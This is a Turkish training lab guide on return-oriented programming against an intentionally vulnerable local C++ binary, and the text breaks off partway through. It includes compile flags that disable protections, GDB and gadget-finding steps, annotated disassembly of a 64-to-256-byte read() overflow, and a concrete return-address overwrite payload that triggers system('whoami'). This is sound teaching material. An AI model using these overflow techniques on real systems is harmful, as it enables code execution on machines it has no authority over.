# CyberLabs: ROP (Return-Oriented Programming) Zafiyeti Laboratuvarı

**Modül Kodu:** CL-MEM-005

**Seviye:** İleri

**Konu:** Modern Exploit Teknikleri ve Koruma Bypass

## Laboratuvarın Amacı

Bu laboratuvar, CyberLabs eğitim platformu için hazırlanmış olup, modern exploit tekniklerinden biri olan **Return-Oriented Programming (ROP)** konusunu ele almaktadır. Katılımcıların bu laboratuvar sonunda aşağıdaki yetkinlikleri kazanması hedeflenmektedir:

- ROP tekniğinin temel prensiplerini ve NX bit korumasını nasıl aştığını anlamak.
- Mevcut kod parçalarını (gadget'ları) kullanarak program akışını kontrol etmeyi öğrenmek.
- `objdump`, `gdb` ve `ROPgadget` gibi araçlarla gadget analizi yapmak.
- Gerçek bir ROP chain oluşturarak program akışını ele geçirmeyi pratik olarak görmek.
- Modern koruma mekanizmalarını (NX, ASLR, Stack Canary) aşma tekniklerini öğrenmek.

## Zorluk Seviyeleri

## 🟢 **KOLAY YOL: Debug Sembolleri ile**
```bash
# test_lab.sh dosyasında -g flag'ini ekleyin
g++ -m64 -fno-stack-protector -z execstack -no-pie -g -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```
- Debug sembolleri ile daha kolay analiz
- GDB'de `p &variable` komutları çalışır
- Eğitim amaçlı ideal

## 🔴 **ZOR YOL: Debug Sembolleri Olmadan (Varsayılan)**
```bash
# Mevcut derleme (debug sembolleri yok)
g++ -m64 -fno-stack-protector -z execstack -no-pie -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```
- Gerçek dünyaya daha yakın
- `info functions`, `disassemble` komutları gerekir
- Production binary'lerde debug sembolleri yoktur

## ROP (Return-Oriented Programming) Nedir?

**Return-Oriented Programming (ROP)**, modern işletim sistemlerindeki **NX bit** (No-Execute) korumasını aşmak için geliştirilmiş bir exploit tekniğidir. Bu teknik, saldırganın kendi shellcode'unu çalıştırması yerine, programda zaten mevcut olan kod parçalarını (gadget'ları) kullanarak program akışını kontrol etmesini sağlar.

### ROP'un Temel Prensipleri:

1. **Gadget Bulma:** Programda `ret` komutu ile biten küçük kod parçalarını bulma
2. **Chain Oluşturma:** Bu gadget'ları sıralı olarak birleştirerek istenen işlevi gerçekleştirme
3. **Stack Manipulation:** Stack'i kullanarak gadget'lar arasında veri aktarımı yapma
4. **Return Address Overwrite:** Buffer overflow ile return address'i ilk gadget'ın adresi ile değiştirme

### ROP Avantajları:
- NX bit korumasını aşar
- ASLR'ı aşabilir (information leak ile)
- Stack Canary'yi aşabilir
- Gerçek kod kullanır, antivirus tarafından tespit edilmesi zor

## Disclaimer / Yasal Uyarı

Bu laboratuvar içeriği, tamamen **CyberLabs eğitim ortamı** için tasarlanmıştır. Buradaki bilgi ve kodların amacı, siber güvenlik uzmanlarının savunma mekanizmalarını daha iyi anlamalarına ve zafiyet analizi yeteneklerini geliştirmelerine yardımcı olmaktır.

### Yasak Kullanımlar
- CyberLabs eğitim ortamı dışında kullanım
- Yasa dışı faaliyetler veya yetkisiz sistem erişimi
- Gerçek sistemlerin kötü niyetli sömürülmesi
- Eğitim dışı amaçlarla dağıtım

### Sorumluluk
Bu materyallerin CyberLabs ortamı dışında veya yasa dışı amaçlarla kullanılması kesinlikle yasaktır ve tüm sorumluluk kullanıcıya aittir. Yazarlar ve CyberLabs, bu eğitim materyallerinin kötüye kullanımından sorumlu değildir.

## Senaryo

Laboratuvar senaryosu, iki ana bileşenden oluşmaktadır:

1. **`vulnerable_code.cpp`:** İçerisinde kasıtlı olarak bir buffer overflow zafiyeti barındıran, C++ ile yazılmış hedef uygulama. NX bit koruması aktif olmasına rağmen ROP ile sömürülebilir.

2. **`exploit.py`:** Zafiyetli uygulamadaki açığı kullanarak ROP chain oluşturan ve program akışını ele geçiren Python exploit script'i.

## Platform Uyumluluğu

Bu lab hem **Linux (x86_64)** hem de **macOS (ARM64)** platformlarında çalışır:

### 🐧 **Linux x86_64**
- Gerçek ROP chain kullanır
- x86_64 assembly gadget'ları
- NX bit bypass teknikleri
- Production benzeri ortam

### 🍎 **macOS ARM64**
- Eğitim amaçlı basit ROP chain
- ARM64 mimarisi farklılıkları
- Platform-specific optimizasyonlar
- Geliştirme ortamı

## Kurulum ve Çalıştırma Adımları

### 1. Zafiyetli Kodu Derleme

```bash
# Otomatik derleme (platform detection ile)
./compile_linux.sh

# Linux için manuel derleme
g++ -m64 -fno-stack-protector -z execstack -no-pie -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp

# macOS için manuel derleme
g++ -m64 -fno-stack-protector -no-pie -Wno-unused-result -Wno-shift-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```

**Derleme Bayrakları Açıklaması:**
- `-m64`: 64-bit derleme
- `-fno-stack-protector`: Stack canary korumasını devre dışı bırak
- `-z execstack`: Stack'i executable yap (bazı ROP teknikleri için)
- `-no-pie`: Position Independent Executable'ı devre dışı bırak
- `-Wno-unused-result`: Kullanılmayan sonuç uyarılarını bastır
- `-Wno-stringop-overflow`: String overflow uyarılarını bastır

### 2. ROP Gadget'larını Analiz Etme

```bash
# Objdump ile gadget'ları bulma
objdump -d compiled/vulnerable_code | grep -E "(pop rdi|pop rsi|pop rdx|syscall)"

# ROPgadget aracı ile (eğer yüklüyse)
ROPgadget --binary compiled/vulnerable_code --ropchain
```

### 3. GDB ile Dinamik Analiz

```bash
gdb ./compiled/vulnerable_code
(gdb) info functions
(gdb) disassemble win_function
(gdb) disassemble gadget_pop_rdi
(gdb) break vulnerable_function
(gdb) run
```

### 4. Exploit Çalıştırma

```bash
# Otomatik test
./test_lab.sh

# Manuel exploit
python3 source_code/exploit.py
```

## ROP Chain Yapısı

Bu laboratuvarda kullanılan ROP chain yapısı:

### 🐧 **Linux x86_64:**
```
Buffer Overflow (64 bytes) + 
Return Address Overwrite (8 bytes) +
ROP Chain:
├── pop rdi; ret (gadget)
├── 0x0 (rdi değeri)
├── pop rsi; ret (gadget)  
├── 0x0 (rsi değeri)
├── pop rdx; ret (gadget)
├── 0x0 (rdx değeri)
├── syscall; ret (gadget)
└── execute_whoami (shellcode enjeksiyonu)
```

### 🍎 **macOS ARM64:**
```
Buffer Overflow (64 bytes) + 
Return Address Overwrite (8 bytes) +
ROP Chain:
└── execute_whoami (basit komut enjeksiyonu)
```

### 💻 **Shellcode Enjeksiyonu:**
- **Linux:** Gerçek ROP chain ile `system("whoami")` çağrısı
- **macOS:** Basit fonksiyon çağrısı ile `system("whoami")` çalıştırma
- **Hedef:** Sistem komutlarını ROP ile çalıştırma

## Öğrenme Hedefleri

### Temel Seviye:
- ROP tekniğinin ne olduğunu anlama
- Gadget kavramını öğrenme
- Basit ROP chain oluşturma

### Orta Seviye:
- NX bit korumasını aşma
- Stack manipulation teknikleri
- Register değerlerini kontrol etme

### İleri Seviye:
- Karmaşık ROP chain'leri
- ASLR bypass teknikleri
- Real-world ROP exploit'leri

## Gerekli Araçlar

- **GDB:** Dinamik analiz ve debugging
- **objdump:** Statik analiz ve gadget bulma
- **ROPgadget:** Otomatik gadget analizi (opsiyonel)
- **pwntools:** Python exploit geliştirme
- **hexdump:** Binary veri analizi

## Troubleshooting

### Yaygın Sorunlar:

1. **"Permission denied" hatası:**
   ```bash
   chmod +x compiled/vulnerable_code
   ```

2. **"Address not found" hatası:**
   - GDB ile adresleri manuel bulun
   - `info functions` komutunu kullanın

3. **"ROP chain failed" hatası:**
   - Gadget adreslerini kontrol edin
   - Stack alignment'ı kontrol edin

## Tam Çözüm (GDB ile Adres Bulma)

### 1. GDB ile Adres Bulma

```bash
# Binary'yi GDB ile aç
gdb ./compiled/vulnerable_code

# Fonksiyon adreslerini bul
(gdb) info functions
(gdb) info functions win_function
(gdb) info functions execute_whoami
(gdb) info functions gadget_pop_rdi
(gdb) info functions gadget_pop_rsi
(gdb) info functions gadget_pop_rdx
(gdb) info functions gadget_syscall

# Gerçek adresler (Linux x86_64):
# win_function: 0x401166
# execute_whoami: 0x401220
# gadget_pop_rdi: 0x401323
# gadget_pop_rsi: 0x40133a
# gadget_pop_rdx: 0x401351
# gadget_syscall: 0x401368

# ROPgadget ile bulunan gerçek gadget'lar:
# pop rdi; ret: 0x401383
# pop rsi; ret: 0x40138c
# pop rdx; ret: 0x401395
# syscall: 0x40139e

# Disassembly ile gadget'ları incele
(gdb) disassemble win_function
(gdb) disassemble execute_whoami
(gdb) disassemble gadget_pop_rdi
(gdb) disassemble gadget_pop_rsi
(gdb) disassemble gadget_pop_rdx
(gdb) disassemble gadget_syscall

# Gerçek Assembly Kodları (Linux x86_64) - Detaylı Analiz:

# ========================================
# win_function (0x401166) - Detaylı İnceleme
# ========================================
# 0x401166: push %rbp
# AÇIKLAMA: RBP register'ını stack'e kaydet (stack frame başlangıcı)
# NEDEN ÖNEMLİ: Fonksiyon başlangıcında stack frame oluşturur

# 0x401167: mov %rsp,%rbp  
# AÇIKLAMA: RSP'yi RBP'ye kopyala (stack frame pointer)
# NEDEN ÖNEMLİ: Yerel değişkenlere erişim için referans noktası

# 0x40116a: lea 0xe97(%rip),%rax        # 0x402008
# AÇIKLAMA: RIP + 0xe97 adresini RAX'e yükle (string adresi)
# NEDEN ÖNEMLİ: "ROP Vulnerability Lab Basarili!" string'ini işaret eder
# RIP = 0x40116a + 0xe97 = 0x402008

# 0x401171: mov %rax,%rsi
# AÇIKLAMA: RAX'i RSI'ya kopyala (2. parametre)
# NEDEN ÖNEMLİ: std::cout'a string parametresi geçer

# 0x401174: lea 0x2ec5(%rip),%rax        # 0x404040 <_ZSt4cout@GLIBCXX_3.4>
# AÇIKLAMA: RIP + 0x2ec5 adresini RAX'e yükle (cout objesi)
# NEDEN ÖNEMLİ: std::cout objesinin adresini alır
# RIP = 0x401174 + 0x2ec5 = 0x404040

# 0x40117b: mov %rax,%rdi
# AÇIKLAMA: RAX'i RDI'ya kopyala (1. parametre)
# NEDEN ÖNEMLİ: std::cout << string için 1. parametre

# 0x40117e: call 0x401040 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
# AÇIKLAMA: std::cout << string operatörünü çağır
# NEDEN ÖNEMLİ: String'i ekrana yazdırır

# 0x401216: mov $0x0,%edi
# AÇIKLAMA: RDI'ya 0 değerini yükle (exit kodu)
# NEDEN ÖNEMLİ: exit(0) için parametre hazırlar

# 0x40121b: call 0x401060 <exit@plt>
# AÇIKLAMA: exit(0) fonksiyonunu çağır
# NEDEN ÖNEMLİ: Programı 0 kodu ile sonlandırır

# ========================================
# execute_whoami (0x401220) - Detaylı İnceleme  
# ========================================
# 0x401220: push %rbp
# AÇIKLAMA: RBP register'ını stack'e kaydet
# NEDEN ÖNEMLİ: Stack frame başlangıcı

# 0x401221: mov %rsp,%rbp
# AÇIKLAMA: RSP'yi RBP'ye kopyala
# NEDEN ÖNEMLİ: Yerel değişkenler için referans

# 0x401224: sub $0x10,%rsp
# AÇIKLAMA: Stack'ten 16 byte yer ayır (yerel değişkenler için)
# NEDEN ÖNEMLİ: Yerel değişkenler için stack alanı

# 0x401228: lea 0xe89(%rip),%rax        # 0x4020b8
# AÇIKLAMA: "Shellcode Enjeksiyonu Basarili!" string adresini al
# NEDEN ÖNEMLİ: İlk mesajı yazdırmak için
# RIP = 0x401228 + 0xe89 = 0x4020b8

# 0x40122f: mov %rax,%rsi
# AÇIKLAMA: String adresini RSI'ya kopyala (2. parametre)
# NEDEN ÖNEMLİ: std::cout'a string parametresi

# 0x401232: lea 0x2e07(%rip),%rax        # 0x404040 <_ZSt4cout@GLIBCXX_3.4>
# AÇIKLAMA: std::cout objesinin adresini al
# NEDEN ÖNEMLİ: std::cout operatörü için

# 0x401239: mov %rax,%rdi
# AÇIKLAMA: cout objesini RDI'ya kopyala (1. parametre)
# NEDEN ÖNEMLİ: std::cout << string için 1. parametre

# 0x40123c: call 0x401040 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
# AÇIKLAMA: std::cout << string operatörünü çağır
# NEDEN ÖNEMLİ: İlk mesajı ekrana yazdırır

# 0x40127e: lea 0xe7d(%rip),%rax        # 0x402102
# AÇIKLAMA: "whoami" string adresini al
# NEDEN ÖNEMLİ: system("whoami") için parametre
# RIP = 0x40127e + 0xe7d = 0x402102

# 0x401285: mov %rax,%rdi
# AÇIKLAMA: "whoami" string'ini RDI'ya kopyala (1. parametre)
# NEDEN ÖNEMLİ: system() fonksiyonuna parametre

# 0x401288: call 0x401030 <system@plt>
# AÇIKLAMA: system("whoami") fonksiyonunu çağır
# NEDEN ÖNEMLİ: ⭐ ANA HEDEF! whoami komutunu çalıştırır

# 0x401319: mov $0x0,%edi
# AÇIKLAMA: RDI'ya 0 değerini yükle (exit kodu)
# NEDEN ÖNEMLİ: exit(0) için parametre

# 0x40131e: call 0x401060 <exit@plt>
# AÇIKLAMA: exit(0) fonksiyonunu çağır
# NEDEN ÖNEMLİ: Programı düzgün sonlandırır

# ========================================
# gadget_pop_rdi (0x401323) - Dummy Fonksiyon
# ========================================
# 0x401323: push %rbp
# AÇIKLAMA: RBP'yi stack'e kaydet
# NEDEN ÖNEMLİ: Fonksiyon başlangıcı

# 0x401324: mov %rsp,%rbp
# AÇIKLAMA: Stack frame pointer oluştur
# NEDEN ÖNEMLİ: Yerel değişkenler için

# 0x401327: movl $0x0,-0x4(%rbp)
# AÇIKLAMA: Yerel değişkene 0 değeri yaz
# NEDEN ÖNEMLİ: Sadece dummy işlem

# 0x40132e: mov -0x4(%rbp),%eax
# AÇIKLAMA: Yerel değişkeni EAX'e oku
# NEDEN ÖNEMLİ: Sadece dummy işlem

# 0x401331: add $0x1,%eax
# AÇIKLAMA: EAX'e 1 ekle
# NEDEN ÖNEMLİ: Sadece dummy işlem

# 0x401334: mov %eax,-0x4(%rbp)
# AÇIKLAMA: EAX'i yerel değişkene yaz
# NEDEN ÖNEMLİ: Sadece dummy işlem

# 0x401337: nop
# AÇIKLAMA: Hiçbir şey yapma (no operation)
# NEDEN ÖNEMLİ: Sadece dummy işlem

# 0x401338: pop %rbp
# AÇIKLAMA: RBP'yi stack'ten geri yükle
# NEDEN ÖNEMLİ: Stack frame temizliği

# 0x401339: ret
# AÇIKLAMA: Fonksiyondan dön
# NEDEN ÖNEMLİ: ⚠️ Sadece ret var, pop rdi yok!

# ========================================
# Gerçek ROP Gadget'ları (ROPgadget ile bulunan)
# ========================================
# pop rdi; ret (0x401383):
# 0x401383: pop %rdi
# AÇIKLAMA: Stack'ten değer alıp RDI'ya yükle
# NEDEN ÖNEMLİ: ⭐ GERÇEK GADGET! 1. parametre için

# 0x401384: ret
# AÇIKLAMA: Fonksiyondan dön
# NEDEN ÖNEMLİ: ROP chain'de bir sonraki gadget'a geç

# pop rsi; ret (0x40138c):
# 0x40138c: pop %rsi
# AÇIKLAMA: Stack'ten değer alıp RSI'ya yükle
# NEDEN ÖNEMLİ: ⭐ GERÇEK GADGET! 2. parametre için

# 0x40138d: ret
# AÇIKLAMA: Fonksiyondan dön
# NEDEN ÖNEMLİ: ROP chain'de devam

# pop rdx; ret (0x401395):
# 0x401395: pop %rdx
# AÇIKLAMA: Stack'ten değer alıp RDX'ya yükle
# NEDEN ÖNEMLİ: ⭐ GERÇEK GADGET! 3. parametre için

# 0x401396: ret
# AÇIKLAMA: Fonksiyondan dön
# NEDEN ÖNEMLİ: ROP chain'de devam

# syscall (0x40139e):
# 0x40139e: syscall
# AÇIKLAMA: Sistem çağrısı yap
# NEDEN ÖNEMLİ: ⭐ GERÇEK SYSCALL! Doğrudan kernel çağrısı

# ========================================
# ZAFİYET ANALİZİ - Buffer Overflow Detayları
# ========================================

# vulnerable_function (0x4013a4) - ZAFİYETİN KAYNAĞI:
# 0x4013a4: push %rbp
# AÇIKLAMA: Stack frame başlangıcı
# ZAFİYET: Bu noktada stack düzeni oluşur

# 0x4013a5: mov %rsp,%rbp
# AÇIKLAMA: Stack frame pointer oluştur
# ZAFİYET: RBP stack'in başlangıç noktasını işaret eder

# 0x4013a8: sub $0x40,%rsp
# AÇIKLAMA: Stack'ten 64 byte yer ayır (buffer için)
# ZAFİYET: ⚠️ SADECE 64 BYTE! Ama 256 byte okuyacak
# STACK LAYOUT:
# +------------------+ <- $rsp + 0x48 (72 bytes) - RETURN ADDRESS
# | 0x0000000000401471| <- Bu değer değiştirilecek
# +------------------+ <- $rsp + 0x40 (64 bytes) - SAVED RBP  
# | 0x0000000000000000| <- Bu değer korunacak
# +------------------+ <- $rsp + 0x8 (0-63 bytes) - BUFFER[64]
# | 0x0000000000000000| <- Buraya 72 byte yazılacak
# | 0x0000000000000000| <- Buffer devam ediyor...
# | 0x0000000000000000| <- ...64 byte'a kadar
# +------------------+ <- $rsp + 0x0 - FUNCTION ARGS
# | 0x0000000000000000| <- Function arguments

# 0x4013ac: lea 0xe55(%rip),%rax        # 0x402208
# AÇIKLAMA: "Giris yapin: " string adresini al
# ZAFİYET: Bu string prompt'u yazdırır

# 0x4013b3: mov %rax,%rsi
# AÇIKLAMA: String adresini RSI'ya kopyala (2. parametre)
# ZAFİYET: std::cout'a parametre geçer

# 0x4013b6: lea 0x2a83(%rip),%rax        # 0x404040 <_ZSt4cout@GLIBCXX_3.4>
# AÇIKLAMA: std::cout objesinin adresini al
# ZAFİYET: std::cout operatörü için

# 0x4013bd: mov %rax,%rdi
# AÇIKLAMA: cout objesini RDI'ya kopyala (1. parametre)
# ZAFİYET: std::cout << string için 1. parametre

# 0x4013c0: call 0x401040 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
# AÇIKLAMA: std::cout << "Giris yapin: " çağrısı
# ZAFİYET: Prompt'u ekrana yazdırır

# 0x4013c5: lea -0x40(%rbp),%rax
# AÇIKLAMA: Buffer'ın adresini al ($rbp - 0x40)
# ZAFİYET: ⚠️ BUFFER ADRESİ! 64 byte'lık buffer'ın başlangıcı
# BUFFER ADRESİ = $rbp - 0x40 = $rsp + 0x8

# 0x4013c9: mov %rax,%rdi
# AÇIKLAMA: Buffer adresini RDI'ya kopyala (1. parametre)
# ZAFİYET: read() fonksiyonuna buffer parametresi

# 0x4013cc: mov $0x100,%esi
# AÇIKLAMA: RSI'ya 256 değerini yükle (okunacak byte sayısı)
# ZAFİYET: ⚠️ 256 BYTE OKUYACAK! Ama buffer sadece 64 byte

# 0x4013d1: call 0x401070 <read@plt>
# AÇIKLAMA: read(0, buffer, 256) çağrısı
# ZAFİYET: ⭐ ANA ZAFİYET! 256 byte okuyup 64 byte buffer'a yazıyor
# BU ZAFİYET NEDENİYLE:
# - 64 byte buffer + 8 byte saved RBP = 72 byte
# - 72 byte'dan sonraki 8 byte = RETURN ADDRESS
# - 256 byte okursa, return address'i değiştirebilir

# 0x4013d6: lea -0x40(%rbp),%rax
# AÇIKLAMA: Buffer adresini tekrar al
# ZAFİYET: Buffer içeriğini yazdırmak için

# 0x4013da: mov %rax,%rsi
# AÇIKLAMA: Buffer adresini RSI'ya kopyala (2. parametre)
# ZAFİYET: std::cout'a buffer parametresi

# 0x4013dd: lea 0x2a5c(%rip),%rax        # 0x404040 <_ZSt4cout@GLIBCXX_3.4>
# AÇIKLAMA: std::cout objesinin adresini al
# ZAFİYET: std::cout operatörü için

# 0x4013e4: mov %rax,%rdi
# AÇIKLAMA: cout objesini RDI'ya kopyala (1. parametre)
# ZAFİYET: std::cout << buffer için 1. parametre

# 0x4013e7: call 0x401040 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
# AÇIKLAMA: std::cout << buffer çağrısı
# ZAFİYET: Buffer içeriğini ekrana yazdırır

# 0x4013ec: nop
# AÇIKLAMA: Hiçbir şey yapma
# ZAFİYET: Fonksiyon sonu

# 0x4013ed: leave
# AÇIKLAMA: Stack frame'i temizle (mov %rbp,%rsp; pop %rbp)
# ZAFİYET: ⚠️ BU NOKTA ZAFİYET! Return address'i okuyacak
# Eğer buffer overflow varsa, yanlış return address'e dönecek

# 0x4013ee: ret
# AÇIKLAMA: Return address'e dön
# ZAFİYET: ⭐ ZAFİYET TETİKLENİR! Değiştirilmiş return address'e döner

# ========================================
# ZAFİYETİN TETİKLENME SÜRECİ
# ========================================

# 1. ADIM: Normal Çalışma
# - Buffer: 64 byte (0x4013a8: sub $0x40,%rsp)
# - Read: 256 byte (0x4013cc: mov $0x100,%esi)
# - ZAFİYET: 256 > 64, buffer overflow!

# 2. ADIM: Stack Corruption
# - 0-63 byte: Buffer içeriği
# - 64-71 byte: Saved RBP (8 byte)
# - 72-79 byte: RETURN ADDRESS (8 byte) ⚠️
# - 80+ byte: Stack'in geri kalanı

# 3. ADIM: Return Address Değişimi
# - Normal: 0x401471 (main'den dönüş)
# - Exploit: 0x401220 (execute_whoami)
# - Sonuç: Program execute_whoami'ye yönlendirilir

# 4. ADIM: ROP Chain Çalışması
# - execute_whoami çağrılır
# - system("whoami") çalıştırılır
# - Program exit(0) ile sonlanır

# ========================================
# ZAFİYETİN KODDAKİ KONUMU
# ========================================

# vulnerable_code.cpp'deki zafiyetli kod:
# void vulnerable_function() {
#     char buffer[64];  // ← 64 byte buffer
#     std::cout << "Giris yapin: " << std::endl;
#     read(0, buffer, 256);  // ← 256 byte okuyor! ZAFİYET!
#     std::cout << "Buffer icerigi: " << buffer << std::endl;
# }

# Assembly'deki karşılığı:
# 0x4013a8: sub $0x40,%rsp        // 64 byte buffer
# 0x4013cc: mov $0x100,%esi       // 256 byte okuyacak
# 0x4013d1: call 0x401070 <read@plt>  // read(0, buffer, 256)

# Buffer overflow'u test et
(gdb) break vulnerable_function
(gdb) run
(gdb) x/32gx $rsp
(gdb) continue

# Detaylı dinamik analiz
(gdb) break vulnerable_function
(gdb) run
(gdb) info registers
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp-0x50
(gdb) disassemble vulnerable_function
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) continue
```

### 2. GDB ile Detaylı Dinamik Analiz

#### 2.1. Temel Analiz
```bash
# Binary'yi GDB ile aç
gdb ./compiled/vulnerable_code

# Programı çalıştır ve breakpoint koy
(gdb) break vulnerable_function
(gdb) run

# Register'ları incele
(gdb) info registers
(gdb) info all-registers

# Stack durumunu incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp-0x50
```

#### 2.2. Buffer Overflow Analizi
```bash
# vulnerable_function'da breakpoint
(gdb) break vulnerable_function
(gdb) run

# Stack layout'ını incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp+0x40

# Buffer'ın adresini bul
(gdb) disassemble vulnerable_function
(gdb) x/32gx $rsp+0x8

# Return address'i bul
(gdb) x/gx $rsp+0x48
(gdb) x/gx $rbp+0x8
```

#### 2.3. ROP Chain Testi
```bash
# Payload ile test
(gdb) run
# Payload'ı manuel olarak gir:
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\x12\x40\x00\x00\x00\x00\x00

# Stack'i incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp

# Return address'in değişip değişmediğini kontrol et
(gdb) x/gx $rsp+0x48
(gdb) x/gx $rbp+0x8
```

#### 2.4. Gadget Analizi
```bash
# Gadget'ları tek tek test et
(gdb) break gadget_pop_rdi
(gdb) run
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) info registers

# execute_whoami fonksiyonunu test et
(gdb) break execute_whoami
(gdb) run
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) continue
```

#### 2.5. Memory Layout Analizi
```bash
# Memory mapping'i incele
(gdb) info proc mappings
(gdb) info files
(gdb) info target

# Stack ve heap durumunu incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp-0x100
```

#### 2.6. Gelişmiş GDB Teknikleri
```bash
# Conditional breakpoint'ler
(gdb) break vulnerable_function if $rsp == 0x7fffffffe000
(gdb) break execute_whoami if $rdi == 0x401220

# Watchpoint'ler
(gdb) watch *0x7fffffffe048
(gdb) watch $rsp+0x48

# TUI modunda analiz
(gdb) layout asm
(gdb) layout regs
(gdb) layout split

# Script ile otomatik analiz
(gdb) define analyze_rop
> break vulnerable_function
> run
> x/32gx $rsp
> x/gx $rsp+0x48
> continue
> end
(gdb) analyze_rop
```

#### 2.7. ROP Chain Debugging
```bash
# ROP chain'i adım adım debug et
(gdb) break vulnerable_function
(gdb) run
# Payload'ı gir
(gdb) x/32gx $rsp
(gdb) x/gx $rsp+0x48
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) continue
```

#### 2.8. Exploit Doğrulama
```bash
# Exploit'in çalışıp çalışmadığını kontrol et
(gdb) break execute_whoami
(gdb) run
# Payload'ı gir
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) info registers
(gdb) continue
```

#### 2.9. GDB Script Örnekleri
```bash
# ROP analizi için GDB script
(gdb) define rop_analysis
> echo === ROP Analysis Started ===\n
> break vulnerable_function
> run
> echo === Stack State ===\n
> x/32gx $rsp
> echo === Return Address ===\n
> x/gx $rsp+0x48
> echo === Buffer Content ===\n
> x/32gx $rsp+0x8
> echo === Analysis Complete ===\n
> end

# Gadget test script
(gdb) define test_gadgets
> echo === Testing Gadgets ===\n
> break gadget_pop_rdi
> run
> x/32gx $rsp
> stepi
> info registers
> break gadget_pop_rsi
> continue
> x/32gx $rsp
> stepi
> info registers
> end
```

#### 2.10. Hata Ayıklama Teknikleri
```bash
# Segmentation fault analizi
(gdb) run
# Program crash olduğunda
(gdb) bt
(gdb) info registers
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp

# Stack corruption kontrolü
(gdb) break vulnerable_function
(gdb) run
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) continue
```

### 3. Zafiyet Tespiti ve Analizi

#### 3.1. Buffer Overflow Zafiyeti - Detaylı Analiz
```bash
# 1. ADIM: vulnerable_function'da breakpoint koy
(gdb) break vulnerable_function
(gdb) run

# 2. ADIM: Stack durumunu incele
(gdb) x/32gx $rsp
# ÇIKTI ÖRNEĞİ:
# 0x7fffffffe000: 0x0000000000000000  0x00007fffffffe100
# 0x7fffffffe010: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe020: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe030: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe040: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe050: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe060: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe070: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe080: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe090: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0a0: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0b0: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0c0: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0d0: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0e0: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0f0: 0x0000000000000000  0x0000000000000000

# 3. ADIM: Return address'i bul
(gdb) x/gx $rsp+0x48
# ÇIKTI ÖRNEĞİ: 0x7fffffffe048: 0x0000000000401471
# YORUM: Bu değer main fonksiyonundan dönüş adresi. Bu değeri değiştirmemiz gerekiyor.

# 4. ADIM: Buffer'ın başlangıç adresini bul
(gdb) x/gx $rsp+0x8
# ÇIKTI ÖRNEĞİ: 0x7fffffffe008: 0x0000000000000000
# YORUM: Buffer bu adreste başlıyor. 64 byte boyutunda.

# 5. ADIM: Stack layout'ını anla
# +------------------+ <- $rsp + 0x48 (72 bytes) - RETURN ADDRESS
# | 0x0000000000401471| <- Bu değeri execute_whoami ile değiştireceğiz
# +------------------+ <- $rsp + 0x40 (64 bytes) - SAVED RBP
# | 0x0000000000000000| <- Bu değer korunacak
# +------------------+ <- $rsp + 0x8 (0-63 bytes) - BUFFER[64]
# | 0x0000000000000000| <- Buraya 72 byte 'A' yazacağız
# | 0x0000000000000000| <- Buffer devam ediyor...
# | 0x0000000000000000| <- ...64 byte'a kadar
# +------------------+ <- $rsp + 0x0 - FUNCTION ARGS
# | 0x0000000000000000| <- Function arguments

# 6. ADIM: Buffer overflow testi
(gdb) run
# Payload gir: 72 byte 'A' + execute_whoami adresi
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\x12\x40\x00\x00\x00\x00\x00

# 7. ADIM: Return address'in değişip değişmediğini kontrol et
(gdb) x/gx $rsp+0x48
# ÇIKTI ÖRNEĞİ: 0x7fffffffe048: 0x0000000000401220
# YORUM: ✅ BAŞARILI! Return address execute_whoami (0x401220) ile değişti.
# Eğer hala 0x401471 ise, payload yanlış veya offset hatalı.
```

#### 3.2. ROP Gadget Analizi - Detaylı İnceleme
```bash
# 1. ADIM: Gadget fonksiyonlarını disassemble et
(gdb) disassemble gadget_pop_rdi
# ÇIKTI:
# 0x0000000000401323 <+0>:	push   %rbp
# 0x0000000000401324 <+1>:	mov    %rsp,%rbp
# 0x0000000000401327 <+4>:	movl   $0x0,-0x4(%rbp)
# 0x000000000040132e <+11>:	mov    -0x4(%rbp),%eax
# 0x0000000000401331 <+14>:	add    $0x1,%eax
# 0x0000000000401334 <+17>:	mov    %eax,-0x4(%rbp)
# 0x0000000000401337 <+20>:	nop
